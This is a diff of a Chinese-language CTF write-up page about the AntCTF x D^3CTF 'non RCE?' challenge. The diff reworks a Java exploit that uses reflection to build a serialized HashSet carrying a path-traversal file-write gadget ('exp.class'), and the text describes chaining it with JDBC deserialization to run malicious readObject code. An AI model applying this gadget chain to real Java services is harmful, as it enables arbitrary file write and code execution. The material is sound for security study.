@@ -88,7 +88,7 @@
             <h1>AntCTF x D^3CTF non RCE?</h1>
             <span class="meta">
             	Posted on
-              2021-03-08，9 min read
+              2021-03-08，10 min read
             </span>
           </div>
         </div>
@@ -287,14 +287,13 @@ emmmm。先说一下。后面的利用是<code>SimpleeCache$StoreableCachingMap.
 <p>接下来。就是利用了。<br>
 利用这个写文件的Gadget配合jdbc反序列化往classpath里写入exp.class。里面是重写了readobject方法的恶意类字节码<br>
 然后呢。再配合jdbc反序列化。发送一个恶意类过去。这时候就会在classpath里找对应的class。找到了。触发重写的readobject。执行里面的恶意代码。至此完结</p>
-<p>根据链子写出Exp<br>
-发现公开的EXP。后面反射赋值都是可以省略的。因为类型是泛型。<br>
-<img src="https://guokeya.github.io/post-images/1615380774832.png" alt="" loading="lazy"></p>
+<p>根据链子写出Exp</p>
 <pre><code>package launch;
 
 import checker.DataMap;
 import java.io.*;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.nio.file.Files;
 import java.util.HashMap;
@@ -318,7 +317,36 @@ public class myexp implements Serializable {
         Object entry =  entryConstructor.newInstance(dataMap,&quot;../../../../../../../../../../../exp.class&quot;);
         //DataMap$Entry的this.key	文件名
         HashSet map = new HashSet(1);
-        map.add(entry);
+        map.add(&quot;foo&quot;);
+        Field field = null;
+        try {
+            field = HashSet.class.getDeclaredField(&quot;map&quot;);
+
+        } catch (NoSuchFieldException e) {
+            field = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
+        }
+        field.setAccessible(true);
+        HashMap innimpl = (HashMap) field.get(map);
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
+        }
+        f2.setAccessible(true);
+        Object[] array = (Object[]) f2.get(innimpl);
+        Object node = array[0];
+        if (node == null) {
+            node = array[1];
+        }
+        Field keyField = null;
+        try {
+            keyField = node.getClass().getDeclaredField(&quot;key&quot;);
+        } catch (Exception e) {
+            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
+        }
+        keyField.setAccessible(true);
+        keyField.set(node, entry);
         ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;aaaaa.obj&quot;));
         o.writeObject(map);
         o.flush();
@@ -327,10 +355,8 @@ public class myexp implements Serializable {
 
     }
 }
+
 </code></pre>
-<p>后面再整了一遍。发现对入口点还懵着<br>
-为什么我们修改map的key为恶意对象就可以触发反序列化呢<br>
-<img src="https://guokeya.github.io/post-images/1615378850965.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
